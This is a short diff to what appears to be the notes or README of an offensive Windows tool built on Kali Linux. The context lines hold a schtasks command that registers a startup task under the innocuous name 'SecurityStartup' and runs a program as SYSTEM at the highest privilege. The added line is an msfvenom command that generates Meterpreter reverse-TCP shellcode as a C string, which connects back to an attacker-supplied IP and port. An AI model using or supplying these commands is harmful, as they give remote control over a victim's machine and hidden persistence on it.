@@ -47,3 +47,6 @@ command for compile on kali linux:
 create scheduled task with cmd
     
     schtasks /create /tn "SecurityStartup" /tr "C:\pathtoprogram.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f
+
+
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f c | tr -d '\n' | sed 's/ //g'
